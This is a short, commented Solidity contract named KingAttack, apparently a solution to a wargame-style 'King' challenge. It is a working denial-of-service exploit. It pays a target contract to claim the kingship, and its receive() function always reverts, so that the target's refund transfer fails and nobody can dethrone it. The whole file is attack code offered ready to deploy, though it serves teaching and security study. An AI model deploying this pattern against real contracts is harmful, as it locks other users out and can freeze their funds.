// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    /**
     * The constructor is marked payable to allow the contract to receive ETH
     * at the moment of deployment. This ETH will be used to claim the kingship.
     *
     * Why this matters:
     * - The King contract requires a payment greater than the current prize to become king.
     * - The transfer must come from the contract that wants to become king.
     * - By funding this contract in the constructor, we ensure it holds ETH
     *   and can use it to send the required value during the attack.
     */
    constructor() payable {}

    /**
     * This function sends ETH to the King contract to become the new king.
     * Once this contract is king, it will prevent further changes via its `receive()` function.
     */
    function attack(address _target) external {
        (bool success,) = _target.call{value: address(this).balance}("");
        if (!success) revert("Attack failed");
    }

    /**
     * This receive function reverts on any incoming ETH transfers.
     * This causes the King contract's `transfer()` call to fail,
     * blocking anyone from claiming kingship after us.
     *
     * NOTE:
     * Even if this `receive()` function were removed entirely,
     * the contract would still reject ETH by default,
     * because it has no way to accept it — making the attack just as effective.
     */
    receive() external payable {
        revert("I shall not be dethroned!");
    }
}
